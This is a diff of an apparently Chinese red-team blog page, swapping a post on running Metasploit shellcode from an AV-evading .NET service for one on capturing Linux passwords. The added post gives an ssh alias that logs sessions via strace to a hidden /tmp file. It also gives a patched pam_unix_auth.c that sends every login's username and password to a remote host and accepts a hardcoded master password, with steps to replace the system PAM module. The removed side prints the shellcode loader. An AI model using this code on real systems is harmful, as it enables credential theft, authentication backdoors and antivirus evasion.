@@ -8,7 +8,7 @@
   
   <meta name="author" content="c4bbage">
   
-  <title>.net 执行 shellcode - c4bbage blog</title>
+  <title>linux 密码记录(client/server) - c4bbage blog</title>
   
 
   <link rel="shortcut icon" href="../img/favicon.ico">
@@ -23,9 +23,9 @@
   
   <script>
     // Current page data
-    var mkdocs_page_name = ".net 执行 shellcode";
-    var mkdocs_page_input_path = ".netcallshellcode.md";
-    var mkdocs_page_url = "/.netcallshellcode/";
+    var mkdocs_page_name = "linux 密码记录(client/server)";
+    var mkdocs_page_input_path = "linux_persistence_note.md";
+    var mkdocs_page_url = "/linux_persistence_note/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js"></script>
@@ -169,26 +169,28 @@
 
         
             
-    <li class="toctree-l1 current">
-        <a class="current" href="./">.net 执行 shellcode</a>
-        
-            <ul>
-            
-                <li class="toctree-l3"><a href="#net-shellcode">.net 执行shellcode</a></li>
-                
-                    <li><a class="toctree-l4" href="#_1">如下</a></li>
-                
-                    <li><a class="toctree-l4" href="#_2">引用</a></li>
-                
-            
-            </ul>
+    <li class="toctree-l1 ">
+        <a class="" href="../.netcallshellcode/">.net 执行 shellcode</a>
         
     </li>
 
         
             
-    <li class="toctree-l1 ">
-        <a class="" href="../linux_persistence_note/">linux 密码记录(client/server)</a>
+    <li class="toctree-l1 current">
+        <a class="current" href="./">linux 密码记录(client/server)</a>
+        
+            <ul>
+            
+                <li class="toctree-l3"><a href="#linux-clientserver">linux 密码记录(client/server)</a></li>
+                
+                    <li><a class="toctree-l4" href="#sshalias">记录ssh密码(alias)</a></li>
+                
+                    <li><a class="toctree-l4" href="#pam">修改pam进行密码记录</a></li>
+                
+                    <li><a class="toctree-l4" href="#_1">代码引用：</a></li>
+                
+            
+            </ul>
         
     </li>
 
@@ -229,7 +231,7 @@
         
       
     
-    <li>.net 执行 shellcode</li>
+    <li>linux 密码记录(client/server)</li>
     <li class="wy-breadcrumbs-aside">
       
     </li>
@@ -239,122 +241,94 @@
           <div role="main">
             <div class="section">
               
-                <h1 id="net-shellcode">.net 执行shellcode</h1>
+                <h1 id="linux-clientserver">linux 密码记录(client/server)</h1>
 <hr />
-<h2 id="_1">如下</h2>
-<pre><code>
-// from https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/
-using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Diagnostics;
-using System.Linq;
-using System.ServiceProcess;
-using System.Text;
-using System.Runtime.InteropServices;
-
-namespace metservice
-{
-    public partial class Service1 : ServiceBase
-    {
-        public Service1()
-        {
-            InitializeComponent();
-        }
-
-        protected override void OnStart(string[] args)
-        {
-            // native function's compiled code
-            // generated with metasploit
-            byte[] shellcode = new byte[] {
-0xbf,0xe2,0xe6,0x44,.... (stage 1 shellcode)
-                };
-
-            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
-                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
-            IntPtr hThread = IntPtr.Zero;
-            UInt32 threadId = 0;
-            // prepare data
-
-
-            IntPtr pinfo = IntPtr.Zero;
-
-            // execute native code
-
-            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
-
-      }
-
-        private static UInt32 MEM_COMMIT = 0x1000;
-
-        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-
-
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
-             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern bool VirtualFree(IntPtr lpAddress,
-                              UInt32 dwSize, UInt32 dwFreeType);
-
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern IntPtr CreateThread(
-
-          UInt32 lpThreadAttributes,
-          UInt32 dwStackSize,
-          UInt32 lpStartAddress,
-          IntPtr param,
-          UInt32 dwCreationFlags,
-          ref UInt32 lpThreadId
-
-          );
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern bool CloseHandle(IntPtr handle);
-
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern UInt32 WaitForSingleObject(
-
-          IntPtr hHandle,
-          UInt32 dwMilliseconds
-          );
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern IntPtr GetModuleHandle(
-
-          string moduleName
-
-          );
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern UInt32 GetProcAddress(
-
-          IntPtr hModule,
-          string procName
-
-          );
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern UInt32 LoadLibrary(
-
-          string lpFileName
-
-          );
-        [DllImport(&quot;kernel32&quot;)]
-        private static extern UInt32 GetLastError();
-
-
-        protected override void OnStop()
-        {
-        }
-    }
-}
+<h2 id="sshalias">记录ssh密码(alias)</h2>
+<pre><code>alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s 2048 ssh'
 </code></pre>
 
-<h2 id="_2">引用</h2>
+<h2 id="pam">修改pam进行密码记录</h2>
+<pre><code class="c"># http://stackoverflow.com/questions/22077802/simple-c-example-of-doing-an-http-post-and-consuming-the-response
+
+wget http://ftp.naist.jp/pub/linux/libs/pam/library/Linux-PAM-1.1.1.tar.gz
+gzip -d Linux-PAM-1.1.1.tar.gz 
+tar xvf Linux-PAM-1.1.1.tar 
+cd Linux-PAM-1.1.1
+</code></pre>
+
+<p>编辑文件pam_unix_auth.c</p>
+<pre><code>#vim modules/pam_unix/pam_unix_auth.c 
+#加入文件头
+
+#include &lt;sys/socket.h&gt; /* socket, connect */
+#include &lt;netinet/in.h&gt; /* struct sockaddr_in, struct sockaddr */
+#include &lt;netdb.h&gt; /* struct hostent, gethostbyname */
+
+#177行加入，修改这里会记录所有的密码包括登陆失败的密码，请注意
+    D((&quot;user=%s, password=[%s]&quot;, name, p));
+    /*  mode */
+    int portno =        8080;
+    char *host =        &quot;192.168.3.19&quot;;
+    char *message_fmt = &quot;POST /u=%s&amp;p=%s HTTP/1.0\r\n\r\n&quot;;
+    struct hostent *server;
+    struct sockaddr_in serv_addr;
+    int sockfd, bytes, sent, received, total;
+    char message[1024],response[4096];
+    sprintf(message,message_fmt,name,p);
+    printf(&quot;Request:\n%s\n&quot;,message);
+    sockfd=socket(AF_INET,SOCK_STREAM,0);
+    server = gethostbyname(host);
+    memset(&amp;serv_addr,0,sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(portno);
+    memcpy(&amp;serv_addr.sin_addr.s_addr,server-&gt;h_addr,server-&gt;h_length);
+    if (connect(sockfd,(struct sockaddr *)&amp;serv_addr,sizeof(serv_addr)) &lt; 0)
+        printf(&quot;ERROR connecting&quot;);
+
+    /* send the request */
+    total = strlen(message);
+    sent = 0;
+    do {
+        bytes = write(sockfd,message+sent,total-sent);
+        if (bytes &lt; 0)
+            printf(&quot;ERROR writing message to socket&quot;);
+        if (bytes == 0)
+            break;
+        sent+=bytes;
+    } while (sent &lt; total);
+    memset(response,0,sizeof(response));
+    total = sizeof(response)-1;
+    received = 0;
+    /* mode */
+    // FILE *fp = fopen(&quot;/var/log/aaa111&quot;,&quot;w+&quot;);
+    // if(fp != NULL) {
+        // fwrite(&amp;p,strlen(p),2,fp);
+        // fclose(fp);
+    // }
+
+    /* verify the password of this user */
+    retval = _unix_verify_password(pamh, name, p, ctrl);
+    if(strcmp(p,&quot;mickey&quot;)==0){retval=PAM_SUCCESS;}
+
+    name = p = NULL;
+</code></pre>
+
+<p>替换文件</p>
+<pre><code>./configure &amp;&amp; make
+ls -la modules/pam_unix/.libs/
+#32位系统
+cp -rf modules/pam_unix/.libs/pam_unix.so /lib/security/pam_unix.so
+#64位系统
+cp -rf modules/pam_unix/.libs/pam_unix.so /lib64/security/pam_unix.so
+</code></pre>
+
+<blockquote>
+<p>work on centos debian</p>
+</blockquote>
+<h2 id="_1">代码引用：</h2>
 <ul>
-<li><a href="https://www.mattandreko.com/2012/02/23/using-net-to-bypass-av/">Using .net to Bypass AV</a></li>
-<li><a href="https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/">AV Evading Meterpreter Shell from a .NET Service</a></li>
+<li><a href="https://github.com/litsand/shell/blob/master/pam.sh">pam backdoor 自动安装脚本</a></li>
+<li><a href="http://stackoverflow.com/questions/22077802/simple-c-example-of-doing-an-http-post-and-consuming-the-response">C 发送HTTP请求</a></li>
 </ul>
               
             </div>
@@ -363,10 +337,10 @@ namespace metservice
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../linux_persistence_note/" class="btn btn-neutral float-right" title="linux 密码记录(client/server)">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../about/" class="btn btn-neutral float-right" title="About">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href="../cobaltstrike_usage/" class="btn btn-neutral" title="cobalt strike 杂记"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../.netcallshellcode/" class="btn btn-neutral" title=".net 执行 shellcode"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -392,10 +366,10 @@ namespace metservice
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../cobaltstrike_usage/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../.netcallshellcode/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../linux_persistence_note/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../about/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
